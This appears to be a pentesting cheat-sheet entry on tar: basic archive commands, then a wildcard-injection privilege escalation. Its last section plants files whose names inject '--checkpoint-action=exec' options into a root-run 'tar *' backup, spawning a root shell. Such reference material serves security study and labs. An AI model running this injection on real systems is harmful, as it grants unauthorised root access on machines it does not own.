---
title: Tar
desc: Archives files and directories, or extracts them.
tags: [Linux, PrivEsc, SMB, SUID, Windows]
alts: [7zip, Bzip2, Gzip, Zip]
website:
render_with_liquid: false
---

## Create archives

```sh
tar -cf archive.tar sample.txt
tar -cf archive.tar sample1.txt sample2.txt
```

<br />

## Extract

```sh
tar -xf archive.tar
```

<br />

## View the content

```sh
tar -tf archive.tar
```

<br />

## Wildcard Injection

```sh
# Check if there are 'tar' command and wildcard(*) in the sudoers
sudo -l

(root) NOPASSWD: /opt/backups/backup.sh


# Move to the directory and check the content.
cd /opt/backups
cat backup.sh

tar cf backup.tar *


# Payloads
cd /opt/backups
echo -e '#!/bin/bash\n/bin/bash' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1


# Check current user
whoami
```